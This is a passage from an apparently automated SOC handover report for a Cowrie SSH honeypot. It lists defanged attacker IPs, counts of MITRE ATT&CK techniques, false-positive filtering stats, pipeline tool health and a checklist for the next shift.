| `103.163.117[.]84` | BD | Moghbazar Dot Net | **100** ⚠️ | 4 |
| `45.40.143[.]166` | US | GoDaddy.com, LLC | **100** ⚠️ | 4 |
| `18.217.128[.]63` | US | Amazon Technologies Inc. | **100** ⚠️ | 27 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 324 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 184 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 108 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 56 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 56 |

---

## 🔕 False Positive Summary (37 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 27 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 787 cases |
| Tool 34  | Credential Extractor        | ✅ 292 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 52 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 37 filtered (4.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 41 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 108 priority case(s) shown individually · 40 recon entry/entries in table (22 group(s) consolidating 624 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-08T11:03:43Z_
